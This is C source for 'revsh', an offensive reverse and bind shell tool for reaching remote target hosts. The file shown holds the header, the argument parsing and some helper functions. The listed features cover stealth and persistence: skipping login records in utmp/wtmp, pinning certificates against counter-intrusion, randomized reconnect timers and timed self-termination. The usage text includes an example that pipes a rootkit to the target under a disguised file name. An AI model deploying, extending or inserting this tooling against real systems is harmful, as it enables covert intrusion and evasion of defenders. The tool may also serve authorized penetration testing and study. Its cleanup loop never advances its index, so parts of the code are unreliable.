
/***********************************************************************************************************************
 *
 * revsh
 *
 * emptymonkey's reverse shell tool with terminal support!
 *	Now with more Perfect Forward Secrecy!!!
 *
 *
 * 2013-07-17: Original release.
 * 2014-08-22: Complete overhaul w/SSL support.
 *
 *
 * The revsh binary is intended to be used both on the local control host as well as the remote target host. It is
 * designed to establish a remote shell with terminal support. This isn't intended as a replacement for netcat, but
 * rather as a supplementary tool to ease remote interaction during long engagements.
 *
 *
 * Features:
 *		* Reverse Shell.
 *		* Bind Shell.
 *		* Terminal support.
 *		* UTF-8 support.
 *		* Handle window resize events.
 *		* Circumvent utmp / wtmp. (No login recorded.)
 *		* Process rc file commands upon login.
 *		* OpenSSL encryption with key based authentication baked into the binary.
 *		* Anonymous Diffie-Hellman encryption upon request.
 *		* Ephemeral Diffie-Hellman encryption as default.
 *		* Cert pinning for protection against sinkholes and mitm counter-intrusion.
 *		* Connection timeout for remote process self-termination.
 *		* Randomized retry timers for non-predictable auto-reconnection.
 *		* Non-interactive mode for transfering files.
 *
 **********************************************************************************************************************/



#include "common.h"



char *GLOBAL_calling_card = CALLING_CARD;




/***********************************************************************************************************************
 *
 * usage()
 *
 * Input: None.
 * Output: None.
 *
 * Purpose: Educate the user as to the error of their ways.
 *
 **********************************************************************************************************************/
void usage(){
	fprintf(stderr, "\nusage:\t%s [-c [-a] [-d KEYS_DIR] [-f RC_FILE]] [-s SHELL] [-t SEC] [-r SEC1[,SEC2]] [-b [-k]] [-n] [-v] [ADDRESS:PORT]\n", \
			program_invocation_short_name);
	fprintf(stderr, "\n\t-c\t\tRun in command and control mode.\t\t(Default is target mode.)\n");
	fprintf(stderr, "\t-a\t\tEnable Anonymous Diffie-Hellman mode.\t\t(Default is \"%s\".)\n", CONTROLLER_CIPHER);
	fprintf(stderr, "\t-d KEYS_DIR\tReference the keys in an alternate directory.\t(Default is \"%s\".)\n", KEYS_DIR);
	fprintf(stderr, "\t-f RC_FILE\tReference an alternate rc file.\t\t\t(Default is \"%s\".)\n", RC_FILE);
	fprintf(stderr, "\t-s SHELL\tInvoke SHELL as the remote shell.\t\t(Default is \"%s\".)\n", DEFAULT_SHELL);
	fprintf(stderr, "\t-t SEC\t\tSet the connection timeout to SEC seconds.\t(Default is \"%d\".)\n", TIMEOUT);
	fprintf(stderr, "\t-r SEC1,SEC2\tSet the retry time to be SEC1 seconds, or\t(Default is \"%s\".)\n\t\t\tto be random in the range from SEC1 to SEC2.\n", RETRY);
	fprintf(stderr, "\t-b\t\tStart in bind shell mode.\t\t\t(Default is reverse shell mode.)\n");
	fprintf(stderr, "\t-k\t\tStart the bind shell in keep-alive mode.\t(Ignored in reverse shell mode.)\n");
	fprintf(stderr, "\t-n\t\tNon-interactive netcat style data broker.\t(Default is interactive w/remote tty.)\n\t\t\tNo tty. Useful for copying files.\n");
	fprintf(stderr, "\t-v\t\tVerbose output.\n");
	fprintf(stderr, "\t-h\t\tPrint this help.\n");
	fprintf(stderr, "\tADDRESS:PORT\tThe address and port of the listening socket.\t(Default is \"%s\".)\n", ADDRESS);
	fprintf(stderr, "\n\tNotes:\n");
	fprintf(stderr, "\t\t* The -b flag must be invoked on both the control and target hosts to enable bind shell mode.\n");
	fprintf(stderr, "\t\t* Bind shell mode can also be enabled by invoking the binary as 'bindsh' instead of 'revsh'.\n");
	fprintf(stderr, "\t\t* Verbose output may mix with data if -v is used together with -n.\n");
	fprintf(stderr, "\n\tInteractive example:\n");
	fprintf(stderr, "\t\tlocal controller host:\trevsh -c 192.168.0.42:443\n");
	fprintf(stderr, "\t\tremote target host:\trevsh 192.168.0.42:443\n");
	fprintf(stderr, "\n\tNon-interactive example:\n");
	fprintf(stderr, "\t\tlocal controller host:\tcat ~/bin/rootkit | revsh -n -c 192.168.0.42:443\n");
	fprintf(stderr, "\t\tremote target host:\trevsh 192.168.0.42:443 > ./totally_not_a_rootkit\n");
	fprintf(stderr, "\n\n");

	exit(-1);
}




/***********************************************************************************************************************
 *
 * main()
 *
 * Inputs: The usual argument count followed by the argument vector.
 * Outputs: 0 on success. -1 on error.
 *
 * Purpose: main() runs the show.
 *
 * Notes:
 *	main() can be broken into three sections:
 *		1) Basic initialization.
 *		2) Setup the controller and call broker().
 *		3) Setup the target and call broker().
 *
 **********************************************************************************************************************/
int main(int argc, char **argv){


	int retval;
	int opt;
	char *tmp_ptr;

	struct remote_io_helper io;
	struct configuration_helper config;

	char *retry_string = RETRY;



	/*
	 * Basic initialization.
	 */

	io.local_in_fd = fileno(stdin);
	io.local_out_fd = fileno(stdout);
	io.fingerprint_type = NULL;


	io.controller = 0;
	config.interactive = 1;
  config.shell = NULL;
  config.env_string = NULL;
  config.rc_file = RC_FILE;
  config.keys_dir = KEYS_DIR;
  config.bindshell = 0;
  config.keepalive = 0;
  config.timeout = TIMEOUT;
  config.verbose = 0;

	config.encryption = EDH;
  config.cipher_list = NULL;


	/*  Normally I would use the Gnu version. However, this tool needs to be more portable. */
	/*  Keeping the naming scheme, but setting it up myself. */
	if((program_invocation_short_name = strrchr(argv[0], '/'))){
		program_invocation_short_name++;
	}else{
		program_invocation_short_name = argv[0];
	}


	while((opt = getopt(argc, argv, "pbkacs:d:f:r:ht:nv")) != -1){
		switch(opt){

			/*  plaintext */
			/*  */
			/*  The plaintext case is an undocumented "feature" which should be difficult to use. */
			/*  You will need to pass the -p switch from both ends in order for it to work. */
			/*  This is provided for debugging purposes only. */
			case 'p':
				config.encryption = PLAINTEXT;
				break;

				/*  bindshell */
			case 'b':
				config.bindshell = 1;
				break;

			case 'k':
				config.keepalive = 1;
				break;

			case 'a':
				config.encryption = ADH;
				break;

			case 'c':
				io.controller = 1;
				break;

			case 's':
				config.shell = optarg;
				break;

			case 'd':
				config.keys_dir = optarg;
				break;

			case 'f':
				config.rc_file = optarg;
				break;

			case 'r':
				retry_string = optarg;
				break;

			case 't':
				errno = 0;
				config.timeout = strtol(optarg, NULL, 10);
				if(errno){
					fprintf(stderr, "%s: %d: strtol(%s, NULL, 10): %s\r\n", \
							program_invocation_short_name, io.controller, optarg, \
							strerror(errno));
					usage();
				}
				break;

			case 'n':
				config.interactive = 0;
				break;

			case 'v':
				config.verbose = 1;
				break;

			case 'h':
			default:
				usage();
		}
	}

	tmp_ptr = strrchr(argv[0], '/');	
	if(!tmp_ptr){
		tmp_ptr = argv[0];
	}else{
		tmp_ptr++;
	}

	if(!strncmp(tmp_ptr, "bindsh", 6)){
		config.bindshell = 1;
	}

	switch(config.encryption){

		case ADH:
			config.cipher_list = ADH_CIPHER;
			break;

		case EDH:
			config.cipher_list = CONTROLLER_CIPHER;
			break;
	}


	if((argc - optind) == 1){
		config.ip_addr = argv[optind];
	}else if((argc - optind) == 0){
		config.ip_addr = ADDRESS;
	}else{
		usage();
	}

	SSL_library_init();
	SSL_load_error_strings();

	/*  Prepare the retry timer values. */
	errno = 0;
	config.retry_start = strtol(retry_string, &tmp_ptr, 10);
	if(errno){
		fprintf(stderr, "%s: %d: strtol(%s, %lx, 10): %s\r\n", \
				program_invocation_short_name, io.controller, retry_string, \
				(unsigned long) &tmp_ptr, strerror(errno));
		exit(-1);
	}

	if(*tmp_ptr != '\0'){
		tmp_ptr++;
	}

	errno = 0;
	config.retry_stop = strtol(tmp_ptr, NULL, 10);
	if(errno){
		fprintf(stderr, "%s: %d: strtol(%s, NULL, 10): %s\r\n", \
				program_invocation_short_name, io.controller, \
				tmp_ptr, strerror(errno));
		exit(-1);
	}


	/*  The joy of a struct with pointers to functions. We only call "io.remote_read()" and the */
	/*  appropriate crypto / no crypto version is called on the backend. */

	io.remote_read = &remote_read_plaintext;
	io.remote_write = &remote_write_plaintext;

	if(config.encryption){
		io.remote_read = &remote_read_encrypted;
		io.remote_write = &remote_write_encrypted;
		io.fingerprint_type = EVP_sha1();
	}

	if(io.controller){
		retval = do_control(&io, &config);
	}else{
		retval = do_target(&io, &config);
	}

	return(retval);
}


/***********************************************************************************************************************
 *
 * dummy_verify_callback()
 *
 * Inputs: The stuff that openssl requires of a verify_callback function. We won't ever use these things, I promise.
 * Outputs: 1. Always 1.
 *
 * Purpose: This dummy function does nothing of interest, but satisfies openssl that a verify_callback function does 
 *  exist. The net effect of a dummy verify_callback function like this is that you can use self signed certs without
 *  any errors.
 *
 **********************************************************************************************************************/
int dummy_verify_callback(int preverify_ok, X509_STORE_CTX* ctx) {

	/*  The point of a dummy function is that it's components won't be used.  */
	/*  We will nop reference them however to silence the noise from the compiler. */
	preverify_ok += 0;
	ctx += 0;

	return(1);
}


/*******************************************************************************
 * 
 * catch_alarm()
 *
 * Input: The signal being handled. (SIGALRM)
 * Output: None. 
 * 
 * Purpose: To catch SIGALRM and exit quietly.
 * 
 ******************************************************************************/
void catch_alarm(int signal){
	exit(-signal);
}


/* 
	 The man page for POSIX_OPENPT(3) states that for code that runs on older systems, you can define this yourself
	 easily.
 */
#ifndef FREEBSD
int posix_openpt(int flags){
	return open("/dev/ptmx", flags);
}
#endif /* FREEBSD */



/**********************************************************************************************************************
 *
 * string_to_vector()
 *
 * Input: A string of tokens, whitespace delimited, null terminated.
 * Output: An array of strings containing the tokens. The array itself is also null terminated. NULL will be returned
 *	on error.
 *
 * Purpose: Tokenize a string for later consumption. 
 *
 **********************************************************************************************************************/
char **string_to_vector(char *command_string){

	int was_space = 1;
	int count = 0;
	int i, len;

	char *index;
	char *token_start = NULL;

	char **argv;

	index = command_string;
	while(*index){

		/*  Lets step through the string and look for tokens. We aren't grabbing them yet, just counting them. */
		/*  Note, we are looking at the transition boundaries from space->!space and !space->space to define the */
		/*  token. "count" will denote these transitions. An odd count implies that we are in a token. An even */
		/*  count implies we are between tokens. */
		if(isspace(*index)){
			if(!was_space){
				/*  end of a token. */
				count++;
			}
			was_space = 1;
		}else{
			if(was_space){
				/*  start of a token. */
				count++;
			}
			was_space = 0;
		}
		index++;
	}

	/*  Don't forget to account for the case where the last token is up against the '\0' terminator with no space */
	/*  between. */
	if(count % 2){
		count++;
	}

	/*  Now, (count / 2) will be the number of tokens. Since we know the number of tokens, lets setup argv. */
	if((argv = (char **) malloc((sizeof(char *) * ((count / 2) + 1)))) == NULL){
		fprintf(stderr, "%s: string_to_vector(): malloc(%d): %s\r\n", program_invocation_short_name, (int) ((sizeof(char *) * ((count / 2) + 1))), strerror(errno));
		return(NULL);
	}
	memset(argv, 0, (sizeof(char *) * ((count / 2) + 1)));

	/*  Now, let's do that loop again, this time saving the tokens. */
	i = 0;
	len = 0;
	count = 0;
	was_space = 1;
	index = command_string;
	while(*index){
		if(isspace(*index)){
			if(!was_space){
				/*  end of a token. */
				if((argv[i] = (char *) malloc(sizeof(char) * (len + 1))) == NULL){
					fprintf(stderr, "%s: string_to_vector(): malloc(%d): %s\r\n", program_invocation_short_name, (int) (sizeof(char) * (len + 1)), strerror(errno));
					goto CLEAN_UP;
				}
				memset(argv[i], 0, sizeof(char) * (len + 1));
				memcpy(argv[i], token_start, sizeof(char) * len);
				i++;
				len = 0;
				count++;
			}
			was_space = 1;
		}else{
			if(was_space){
				/*  start of a token. */
				count++;
				token_start = index;
			}
			len++;
			was_space = 0;
		}
		index++;
	}

	/*  Same final token termination case. */
	if(count % 2){
		if((argv[i] = malloc(sizeof(char) * (len + 1))) == NULL){
			fprintf(stderr, "%s: string_to_vector(): malloc(%d): %s\r\n", program_invocation_short_name, (int) (sizeof(char) * (len + 1)), strerror(errno));
			goto CLEAN_UP;
		}
		memset(argv[i], 0, sizeof(char) * (len + 1));
		memcpy(argv[i], token_start, sizeof(char) * len);
	}

	return(argv);

CLEAN_UP:
	i = 0;
	while(argv[i]){
		free(argv[i]);
	}

	free(argv);
	return(NULL);
}

